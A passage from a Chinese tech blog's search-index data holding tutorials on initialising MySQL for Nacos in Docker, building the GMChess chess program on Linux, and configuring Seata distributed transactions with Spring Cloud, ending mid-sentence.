org.springframework.jdbc.core.JdbcTemplate.queryForObject(JdbcTemplate.java:480) 经过排查，发现可能是以下几方面原因造成： 1）开启系统防火墙导致 2）在 MySQL 的配置文件 /etc/mysql/mysql.conf.d/mysqld.cnf 里，开启了 bind 127.0.0.1 配置项，导致外部无法连接 3）在 MySQL 数据库里不存在 nacos 用户，这是因为在 env 目录下的 Docker-Compose 环境配置文件中，指定了 Nacos 默认连接 MySQL 时使用的用户名和密码为 nacos/nacos 4）在 MySQL 数据库里不存在 nacos_devtest 数据库，这是因为在 env 目录下的 Docker-Compose 环境配置文件中，指定了 Nacos 默认连接的 MySQL 数据库为 nacos_devtest 分析结果：各种假设经过逐一验证后，最终发现导致 Nacos 无法连接 MySQL 数据库的原因，是因为在 MySQL 数据库中，不存在 nacos 用户，同时也不存在 nacos_devtest 数据库，即 MySQL 数据库里没有被初始化过 5.1.2、初始化 MySQL 数据库温馨提示：以下数据库初始化操作适用于 MySQL 5.7、MySQL 8，同时适用于 Nacos 单机模式和集群模式。若使用了不同的 YAML 配置文件来管理 Nacos 的镜像和容器，此时只需要将下列命令中的 example/xxx.yaml 替换为自己所使用的 YAML 配置文件的路径即可。 拷贝数据库初始化脚本 nacos-mysql.sql 到 MySQL 容器的根目录下，并在 MySQL 容器内通过命令行登录进 MySQL 数据库 1234567891011# 启动所有容器# docker-compose -f example/standalone-mysql-5.7.yaml start# 拷贝数据库初始化脚本到MySQL容器的根目录下# docker cp nacos/distribution/conf/nacos-mysql.sql mysql:/# 连接MySQL容器# docker exec -it mysql /bin/bash# 在MySQL容器内，通过命令行登录进MySQL数据库；在终端输入\"mysql\"后，直接按下回车键即可，不需要指定数据库的用户名和密码，默认是以root用户登录# mysql 在 MySQL 的容器内登录进 MySQL 数据库后，执行数据库初始化操作 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# 创建用户mysql&gt; CREATE USER 'nacos'@'%' IDENTIFIED BY 'nacos';# 创建数据库mysql&gt; create database nacos_devtest default character set utf8;# 用户授权访问# GRANT ALL ON nacos_devtest.* TO 'nacos'@'%';# 刷新权限# flush privileges;# 切换数据库mysql&gt; use nacos_devtest;# 执行数据库初始化脚本mysql&gt; source /nacos-mysql.sql;# 查看数据库表mysql&gt; show tables;+------------------------+| Tables_in_nacos_devtest |+------------------------+| config_info || config_info_aggr || config_info_beta || config_info_tag || config_tags_relation || group_capacity || his_config_info || permissions || roles || tenant_capacity || tenant_info || users |+------------------------+12 rows in set (0.00 sec)# 退出登录MySQLmysql&gt; exit# 断开MySQL容器的连接# exit# 重启所有容器# docker-compose -f example/standalone-mysql-5.7.yaml restart 容器重启后，若在 Nacos 的日志文件里观察到以下内容，则说明 Nacos 可以正常启动 12345678910111213# tail -n 20 example/standalone-logs/nacos.log2020-03-12 23:01:50,062 INFO Initializing ExecutorService 'taskScheduler'2020-03-12 23:01:50,092 INFO Exposing 16 endpoint(s) beneath base path '/actuator'2020-03-12 23:01:50,240 INFO Tomcat started on port(s): 8848 (http) with context path '/nacos'2020-03-12 23:01:50,245 INFO Started Nacos in 12.964 seconds (JVM running for 13.92)2020-03-12 23:01:50,246 INFO Nacos Log files: /home/nacos/logs2020-03-12 23:01:50,247 INFO Nacos Log files: /home/nacos/conf2020-03-12 23:01:50,247 INFO Nacos Log files: /home/nacos/data2020-03-12 23:01:50,248 INFO Nacos started successfully in stand alone mode. use external storage2020-03-12 23:01:55,147 INFO Initializing Spring DispatcherServlet 'dispatcherServlet'2020-03-12 23:01:55,147 INFO Initializing Servlet 'dispatcherServlet'2020-03-12 23:01:55,169 INFO Completed initialization in 22 ms Docker 属性配置列表 属性名称 描述 选项 MODE 系统启动方式：集群 / 单机 cluster/standalone 默认 cluster NACOS_SERVERS 集群地址 p1:port1 空格 ip2:port2 空格 ip3:port3 PREFER_HOST_MODE 支持 IP 还是域名模式 hostname/ip 默认 ip NACOS_SERVER_PORT Nacos 运行端口 默认 8848 NACOS_SERVER_IP 多网卡模式下可以指定 IP SPRING_DATASOURCE_PLATFORM 单机模式下支持 MYSQL 数据库 mysql / 空 默认：空 MYSQL_SERVICE_HOST 数据库连接地址 MYSQL_SERVICE_PORT 数据库端口 默认 : 3306 MYSQL_SERVICE_DB_NAME 数据库库名 MYSQL_SERVICE_USER 数据库用户名 MYSQL_SERVICE_PASSWORD 数据库用户密码 MYSQL_SERVICE_DB_PARAM 数据库连接参数 default : characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true MYSQL_DATABASE_NUM It indicates the number of database 默认 :1 JVM_XMS -Xms 默认 :2g JVM_XMX -Xmx 默认 :2g JVM_XMN -Xmn 默认 :1g JVM_MS -XX:MetaspaceSize 默认 :128m JVM_MMS -XX:MaxMetaspaceSize 默认 :320m NACOS_DEBUG 是否开启远程 DEBUG y/n 默认 :n TOMCAT_ACCESSLOG_ENABLED server.tomcat.accesslog.enabled 默认 :false NACOS_AUTH_SYSTEM_TYPE 权限系统类型选择，目前只支持 nacos 类型 默认 :nacos NACOS_AUTH_ENABLE 是否开启权限系统 默认 :false NACOS_AUTH_TOKEN_EXPIRE_SECONDS token 失效时间 默认 :18000 NACOS_AUTH_TOKEN token 默认 :SecretKey012345678901234567890123456789012345678901234567890123456789 NACOS_AUTH_CACHE_ENABLE 权限缓存开关，开启后权限缓存的更新默认有 15 秒的延迟 默认 : false MEMBER_LIST 通过环境变量的方式设置集群地址 例子：192.168.16.101:8847?raft_port=8807,192.168.16.101?raft_port=8808,192.168.16.101:8849?raft_port=8809 EMBEDDED_STORAGE 是否开启集群嵌入式存储模式 embedded 默认 : none 参考资料 Nacos 监控指南 Nacos Docker 项目 Nacos Docker 移除主从镜像配置 Nacos Docker 快速开始（属性配置的内容已过时） var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ \"id\": \"readmore-container\", \"blogId\": \"96641-5333172926158-056\", \"name\": \"全栈技术驿站\", \"qrcode\": \"https://www.techgrow.cn/img/wx_mp_qr.png\", \"keyword\": \"Tech\", \"lockToc\": \"yes\", \"random\": \"0.9\" }); } catch(e) { console.warn(e.name + \" : \" + e.message); } }",tags:"容器化"},{title:"中国象棋之一 Linux 下的象棋软件 GMChess",url:"/posts/e44e61ed.html",text:'GMChess 介绍GMChess（天书棋谈） 是一款由 Lerosua 编写的 Linux 下开源的中国象棋程序，基于 gtkmm 和 C++ 完成，使用了象棋巫师（xqwizard）开源的 ElephantEye（象眼）作为象棋引擎。支持人机对战和人人对战，但是最初只能在同一台机子上进行人人对战，这显然很不方便。于是 Lerosua 又给 GMChess 开发了 pidgin 网络对战插件，支持和好友在线下象棋。注：本文适用于 Centos/Debian/Ubuntu 等 Linux 发行版 GMChess 版本历史 版本 日期 说明 0.10 2009 年 3 月 26 日 仅有读谱功能，读取 qq 象棋、联众象棋、中游象棋、象棋演播室等软件生成的棋谱 0.10.2 2009 年 4 月 12 日 添加棋谱书管理功能 0.20 2009 年 4 月 27 日 添加 AI 对战功能 0.20.1 2009 年 7 月 20 日 gmchess 图标投票，图标及声音文件都替换成 GPL 版权的文件；yalong 的补丁；初步的计时器功能 0.20.2 2009 年 8 月 20 日 更新有版权争议的图片；去除 libglademm 依赖，争取并进入 Debian 0.20.3 2009 年 10 月 9 日 配置目录更改符合 FreeDesktop.org 标准，添加难度设置，改进界面，支持使用黑棋 0.29.3 2010 年 11 月 19 日 未知 0.29.4 2011 年 10 月 15 日 未知 0.29.5 2011 年 12 月 26 日 未知 0.29.6 2011 年 12 月 28 日 未知 GMChess 源码下载GMChess 最新的源码可以在这里（自备梯子）下载，注意 gmchess-0.29.6.tar.bz2 和 pidgin-gmchess-0.02.tar.gz 都要下载编译安装。为了方便没有梯子的网友，提供本站的下载地址： gmchess-0.29.6.tar.bz2 pidgin-gmchess-0.02.tar.gz GMChess 编译安装Centos 系统环境下，编译 GMChess 时可能会因 gcc、g++ 版本对代码存在兼容问题，导致编译失败；至于其他 Linux 发行版的编译安装步骤，可参考下述内容： 1234567891011121314# 在centos系统安装gtkmm24# yum install gtkmm24-devel# 解压源码# tar -xvf gmchess-0.29.6.tar.bz2# 进入解压目录# cd gmchess-0.29.6# 指定安装路径./configure --prefix=/usr/local# 编译安装# make &amp;&amp; make install GMChess Pidgin 插件编译安装1234567891011121314151617181920# 在centos系统安装pidgin（互联网通讯程序）# yum install pidgin pidgin-devel# 创建存放pidgin插件的目录# mkdir -p /usr/lib/pidgin# 解压源码# tar -xvf pidgin-gmchess-0.02.tar.gz# 进入解压目录# cd pidgin-gmchess-0.02# 编译安装# make &amp;&amp; make install# 拷贝Gmchess的插件文件到当前用户的主目录（区分不同的Linux用户）$ mkdir -p ~/.purple/plugins/$ cp gmchess-network.so ~/.purple/plugins/# 最后菜单栏导航到：应用程序 --&gt; 互联网 --&gt; Pidgin（互联网通讯程序）--&gt; 工具 --&gt; 插件 --&gt; 勾选上Pidgin的Gmchess插件，如下图所示 Pidgin 对弈聊天窗口当 GMChess 的 Pidgin 插件安装好后，在 Pidgin 的好友对话框内可看见工具栏右边多了一个 “帅” 字的按钮（如下图）。点击 “帅” 字按钮，发起下棋的邀请后就可以等对方回应了。当对方收到请求，按 yes 则会自动调用 GMChess 开始棋局，按 no 则拒绝应战。同意应战后需要等待一会，GMChess 会自动打开，发起请求的一方会自动成为红方，此时就可以开始对弈了。 参考资料 GMchess 棋力变差 GMChess 中国象棋软件菜单汉化补丁包 中国象棋 Gmchess 的 MQF 棋谱及棋子 下篇 中国象棋之二开源 AI 引擎介绍 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux"},{title:"Seata 入门教程 - 实战篇（电商）",url:"/posts/b0f7bd00.html",text:'上篇 - Seata 入门教程（基础篇） Seata 入门教程 - 基础篇 1、前言 本案例使用的是 Seata 的 AT 模式 由于篇幅有限，本案例只给出各个模块的核心代码和配置，点击下载完整的案例代码（简版） 为了方便演示，本案例只使用 Nacos 作为注册中心，不使用 Nacos 作为配置中心，即使用 file.conf 配置文件来存储 TC（Seata Server）相关的配置信息 最新发布的内容，已追加 TC（Seata Server）整合 Nacos 作为配置中心的教程，点击下载完整的案例代码（配置中心版） 1.1、版本说明 MySQL 5.7 Nacos Server 1.4.0 Seata Server 1.4.0 Springt Boot 2.3.2.RELEASE Spring Cloud Hoxton.SR8 Spring Cloud Alibaba 2.2.3.RELEASE 特别注意：Spring Boot 和 Spring Cloud 以及 Spring Cloud Alibaba 的版本号需要互相对应，否则可能会存在各种问题，具体可以参考官方的版本说明 1.2、案例目标本案例将会创建三个服务，分别是订单服务、库存服务、账户服务，各服务之间的调用流程如下： 1）当用户下单时，调用订单服务创建一个订单，然后通过远程调用（OpenFeign）让库存服务扣减下单商品的库存 2）订单服务再通过远程调用（OpenFeign）让账户服务来扣减用户账户里面的余额 3）最后在订单服务中修改订单状态为已完成 上述操作跨越了三个数据库，有两次远程调用，很明显会有分布式事务的问题，项目的整体结构如下： 12345seata-transaction-demo├── seata-common-api # API模块├── seata-account-service # 账户模块，端口：2002├── seata-storage-service # 库存模块，端口：2000└── seata-order-service # 订单模块，端口：2001 1.3、Seata 分布式交易解决方案 2、准备工作2.1、初始化数据库本案例使用 MySQL 数据库来存储 Seata Server（TC）的全局事务会话信息，因此需要执行 SQL 初始化脚本来创建本案例需要的 Seata 数据库、对应的业务库与业务表。由于 Seata 的 SEATA、AT 模式均需要用到 UNDO_LOG 回滚日志表，因此在每个业务数据库里都要单独创建 UNDO_LOG 回滚日志表，最终所有用到的数据库和业务表如下图所示： 2.2、Nacos 创建命名空间在 Nacos 的控制台创建新的命名空间，后面会将命名空间写在 registry.confg 配置文件中，让 Seata Server 将自身的服务注册到 Nacos 3、配置 Seata Server3.1、创建 file.conffile.conf 是 Seata Server（TC）的配置文件，用于指定 TC 的相关配置，核心配置如下： 123456789101112131415161718192021222324252627service { vgroupMapping.seata-order-service-tx-group = "default" vgroupMapping.seata-storage-service-tx-group = "default" vgroupMapping.seata-account-service-tx-group = "default"}store { mode = "db" db { ## the implement of javax.sql.DataSource, such as DruidDataSource(druid)/BasicDataSource(dbcp)/HikariDataSource(hikari) etc. datasource = "druid" ## mysql/oracle/postgresql/h2/oceanbase etc. dbType = "mysql" driverClassName = "com.mysql.cj.jdbc.Driver" url = "jdbc:mysql://127.0.0.1:3306/seata?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=false" user = "root" password = "123456" minConn = 5 maxConn = 100 globalTable = "global_table" branchTable = "branch_table" lockTable = "lock_table" queryLimit = 100 maxWait = 5000 }} ★file.conf 完整配置★ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154transport { # tcp udt unix-domain-socket type = "TCP" #NIO NATIVE server = "NIO" #enable heartbeat heartbeat = true #thread factory for netty thread-factory { boss-thread-prefix = "NettyBoss" worker-thread-prefix = "NettyServerNIOWorker" server-executor-thread-prefix = "NettyServerBizHandler" share-boss-worker = false client-selector-thread-prefix = "NettyClientSelector" client-selector-thread-size = 1 client-worker-thread-prefix = "NettyClientWorkerThread" # netty boss thread size,will not be used for UDT boss-thread-size = 1 #auto default pin or 8 worker-thread-size = 8 } shutdown { # when destroy server, wait seconds wait = 3 } serialization = "seata" compressor = "none"}service { vgroupMapping.seata-order-service-tx-group = "default" vgroupMapping.seata-storage-service-tx-group = "default" vgroupMapping.seata-account-service-tx-group = "default" default.grouplist = "127.0.0.1:8091" enableDegrade = false disable = false max.commit.retry.timeout = "-1" max.rollback.retry.timeout = "-1" disableGlobalTransaction = false}client { async.commit.buffer.limit = 10000 lock { retry.internal = 10 retry.times = 30 } report.retry.count = 5 tm.commit.retry.count = 1 tm.rollback.retry.count = 1}## transaction log store, only used in seata-serverstore { ## store mode: file、db、redis mode = "db" ## file store property file { ## store location dir dir = "sessionStore" # branch session size , if exceeded first try compress lockkey, still exceeded throws exceptions maxBranchSessionSize = 16384 # globe session size , if exceeded throws exceptions maxGlobalSessionSize = 512 # file buffer size , if exceeded allocate new buffer fileWriteBufferCacheSize = 16384 # when recover batch read size sessionReloadReadSize = 100 # async, sync flushDiskMode = async } ## database store property db { ## the implement of javax.sql.DataSource, such as DruidDataSource(druid)/BasicDataSource(dbcp)/HikariDataSource(hikari) etc. datasource = "druid" ## mysql/oracle/postgresql/h2/oceanbase etc. dbType = "mysql" driverClassName = "com.mysql.cj.jdbc.Driver" url = "jdbc:mysql://127.0.0.1:3306/seata?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=false" user = "root" password = "123456" minConn = 5 maxConn = 100 globalTable = "global_table" branchTable = "branch_table" lockTable = "lock_table" queryLimit = 100 maxWait = 5000 } ## redis store property redis { host = "127.0.0.1" port = "6379" password = "" database = "0" minConn = 1 maxConn = 10 maxTotal = 100 queryLimit = 100 }}lock { ## the lock store mode: local、remote mode = "remote" local { ## store locks in user\'s database } remote { ## store locks in the seata\'s server }}recovery { #schedule committing retry period in milliseconds committing-retry-period = 1000 #schedule asyn committing retry period in milliseconds asyn-committing-retry-period = 1000 #schedule rollbacking retry period in milliseconds rollbacking-retry-period = 1000 #schedule timeout retry period in milliseconds timeout-retry-period = 1000}transaction { undo.data.validation = true undo.log.serialization = "jackson" undo.log.save.days = 7 #schedule delete expired undo_log in milliseconds undo.log.delete.period = 86400000 undo.log.table = "undo_log"}## metrics settingsmetrics { enabled = false registry-type = "compact" # multi exporters use comma divided exporter-list = "prometheus" exporter-prometheus-port = 9898}support { ## spring spring { # auto proxy the DataSource bean datasource.autoproxy = false }} 3.2、创建 registry.confregistry.conf 用于指定 TC 的注册中心和 TC 的配置文件，这里使用 Nacos 作为注册中心，但 TC 的配置信息直接从 file.conf 配置文件中读取，核心配置如下： 123456789101112131415161718192021registry { type = "nacos" nacos { application = "seata-server" serverAddr = "127.0.0.1:8848" group = "seata_demo" namespace = "ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d" cluster = "default" username = "" password = "" }}config { type = "file" file { name = "file.conf" }} ★registry.conf 完整配置★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788registry { # file 、nacos 、eureka、redis、zk、consul、etcd3、sofa type = "nacos" nacos { application = "seata-server" serverAddr = "127.0.0.1:8848" group = "seata_demo" namespace = "ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d" cluster = "default" username = "" password = "" } eureka { serviceUrl = "http://localhost:8761/eureka" application = "default" weight = "1" } redis { serverAddr = "localhost:6379" db = 0 password = "" cluster = "default" timeout = 0 } zk { cluster = "default" serverAddr = "127.0.0.1:2181" sessionTimeout = 6000 connectTimeout = 2000 username = "" password = "" } consul { cluster = "default" serverAddr = "127.0.0.1:8500" } etcd3 { cluster = "default" serverAddr = "http://localhost:2379" } sofa { serverAddr = "127.0.0.1:9603" application = "default" region = "DEFAULT_ZONE" datacenter = "DefaultDataCenter" cluster = "default" group = "SEATA_GROUP" addressWaitTime = "3000" } file { name = "file.conf" }}config { # file、nacos 、apollo、zk、consul、etcd3 type = "file" nacos { serverAddr = "127.0.0.1:8848" namespace = "" group = "SEATA_GROUP" username = "" password = "" } consul { serverAddr = "127.0.0.1:8500" } apollo { appId = "seata-server" apolloMeta = "http://192.168.1.204:8801" namespace = "application" } zk { serverAddr = "127.0.0.1:2181" sessionTimeout = 6000 connectTimeout = 2000 username = "" password = "" } etcd3 { serverAddr = "http://localhost:2379" } file { name = "file.conf" }} 3.3、拷贝配置文件 1）将上面的 file.conf、registry.conf 配置文件拷贝到 Seata Server 的 conf 目录下，直接覆盖原有的配置文件即可 2）由于本案例没有使用配置中心，因此还需要将上面的 file.conf 配置文件拷贝到每个 Maven 子工程的 src/main/resource 目录下 4、创建 Maven 父工程创建 Maven 父工程，配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，项目整体结构如下： ★父工程的 Maven 配置★ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;groupId&gt;com.seata.study&lt;/groupId&gt;&lt;artifactId&gt;seata-transaction-demo&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;pom&lt;/packaging&gt;&lt;modules&gt; &lt;module&gt;seata-common-api&lt;/module&gt; &lt;module&gt;seata-order-service&lt;/module&gt; &lt;module&gt;seata-storage-service&lt;/module&gt; &lt;module&gt;seata-account-service&lt;/module&gt;&lt;/modules&gt;&lt;!-- 统一管理版本 --&gt;&lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;junit.version&gt;4.12&lt;/junit.version&gt; &lt;log4j.version&gt;1.2.17&lt;/log4j.version&gt; &lt;mysql.version&gt;8.0.21&lt;/mysql.version&gt; &lt;spring.cloud.version&gt;Hoxton.SR8&lt;/spring.cloud.version&gt; &lt;spring.boot.version&gt;2.3.2.RELEASE&lt;/spring.boot.version&gt; &lt;spring.cloud.alibaba&gt;2.2.3.RELEASE&lt;/spring.cloud.alibaba&gt; &lt;seata.spring.boot.version&gt;1.4.0&lt;/seata.spring.boot.version&gt; &lt;druid.spring.boot.version&gt;1.2.4&lt;/druid.spring.boot.version&gt; &lt;mybatis.spring.boot.version&gt;2.1.3&lt;/mybatis.spring.boot.version&gt;&lt;/properties&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;!--spring boot--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring.boot.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;!--spring cloud--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring.cloud.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;!--spring cloud alibaba--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-alibaba-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring.cloud.alibaba}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;!--mysql--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;${mysql.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!--druid--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${druid.spring.boot.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!--mybatis--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${mybatis.spring.boot.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!--log4j--&gt; &lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;version&gt;${log4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt; 5、创建订单工程5.1、创建 pom.xml ★订单工程的 Maven 配置★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;parent&gt; &lt;groupId&gt;com.seata.study&lt;/groupId&gt; &lt;artifactId&gt;seata-transaction-demo&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;!--seata-common-api--&gt; &lt;dependency&gt; &lt;groupId&gt;com.seata.study&lt;/groupId&gt; &lt;artifactId&gt;seata-common-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;!--nacos config--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--nacos discovery--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--seata--&gt; &lt;dependency&gt; &lt;!-- 阿里巴巴已经集成服务间调用X-id的传递，包括FeignClient的重写，如果在之前自定义封装过Feign，注意两者之间的冲突--&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-seata&lt;/artifactId&gt; &lt;exclusions&gt; &lt;!--去除默认依赖的版本--&gt; &lt;exclusion&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-spring-boot-starter&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;!-- 指定Seata的版本，需要与Seata服务端的版本保持一致--&gt; &lt;dependency&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${seata.spring.boot.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!--openfeign--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--web--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--actuator--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--mysql--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--druid--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--mybatis--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 5.2、创建 bootstrap.ymlSeata 1.1.0 版本之后客户端已经支持用 YAML 文件替代 xxxx.conf 文件。以下 bootstrap.yml 由于添加了 seata.registry 来配置 Seata Server 所使用的注册中心，因此不再需要拷贝 Seata Server 的 registry.conf 配置文件拷到每个 Maven 子工程的 src/main/resource 目录下。 特别注意：bootstrap.yml 中的 Seata 配置项，必须严格与 Seata Server 的 registry.conf、file.conf 的配置一致，否则会导致应用启动后无法正常连接 Seata Server seata.registry.nacos.group 必须与 Seata Server 的 registry.conf 中的 registry.nacos.group 一致 seata.registry.nacos.namespace 必须与 Seata Server 的 registry.conf 中的 registry.nacos.namespace 一致 seata.registry.nacos.server-addr 必须与 Seata Server 的 registry.conf 中的 registry.nacos.serverAddr 一致 seata.registry.nacos.application 必须与 Seata Server 的 registry.conf 中的 registry.nacos.application 一致 seata.tx-service-group 必须与 Seata Server 的 file.conf 中的 service.vgroupMapping.xxxx = "default" 的 xxxx 一致 在 file.conf 里，service.vgroupMapping.xxxx = "default" 支持配置多个，对应的就是多个微服务应用 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061nacos: # Nacos的地址 server-addr: 127.0.0.1:8848 # Nacos的命名空间 namespace: ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d # Nacos的配置分组 group: seata_demo # Seata Server的配置 seata: application: seata-server tx-service-group: seata-order-service-tx-group####### 以上是自定义配置中心和注册中心的共同属性，方便其他地方直接引用 #######server: port: 2001spring: application: name: seata-order-service cloud: nacos: discovery: server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://127.0.0.1:3306/seata_order?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=false username: root password: 123456mybatis: mapperLocations: classpath*:mapper/*.xml type-aliases-package: com.seata.study.domainseata: enabled: true application-id: ${spring.application.name} tx-service-group: ${nacos.seata.tx-service-group} enable-auto-data-source-proxy: false registry: type: nacos nacos: application: ${nacos.seata.application} server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} username: "" password: "" config: type: filefeign: hystrix: enabled: falselogging: level: io: seata: info 5.3、注入代理数据源Seata 通过代理数据源的方式实现分支事务，其中 MyBatis 和 JPA 都需要注入 io.seata.rm.datasource.DataSourceProxy, 不同的是，MyBatis 还需要额外注入 org.apache.ibatis.session.SqlSessionFactory。在 Spring Boot Seata Starter 2.2.0.RELEASE 及以后版本，代理数据源的注入 Seata 已经自动实现了，即不需要再手动去配置。若希望 Seata 自动注入代理数据源，需要在工程里的 file.conf 配置文件添加 support.spring.datasource.autoproxy=true，手动实现的方式如下： 123456789101112131415161718192021222324252627282930@Configurationpublic class DataSourceProxyConfig { @Value("${mybatis.mapperLocations}") private String mapperLocations; @Value("${mybatis.type-aliases-package}") private String typeAliasesPackage; @Bean @ConfigurationProperties(prefix = "spring.datasource") public DataSource dataSource() { return new DruidDataSource(); } @Bean public DataSourceProxy dataSourceProxy(DataSource dataSource) { return new DataSourceProxy(dataSource); } @Bean public SqlSessionFactory sqlSessionFactory(DataSourceProxy dataSourceProxy) throws Exception { SqlSessionFactoryBean sqlSessionFactoryBean = new SqlSessionFactoryBean(); sqlSessionFactoryBean.setDataSource(dataSourceProxy); sqlSessionFactoryBean.setMapperLocations(new PathMatchingResourcePatternResolver().getResources(mapperLocations)); sqlSessionFactoryBean.setTypeAliasesPackage(typeAliasesPackage); sqlSessionFactoryBean.setTransactionFactory(new SpringManagedTransactionFactory()); return sqlSessionFactoryBean.getObject(); }} 5.4、添加全局事务注解在订单创建的入口方法上面添加 @GlobalTransactional 来控制分布式事务，这里使用 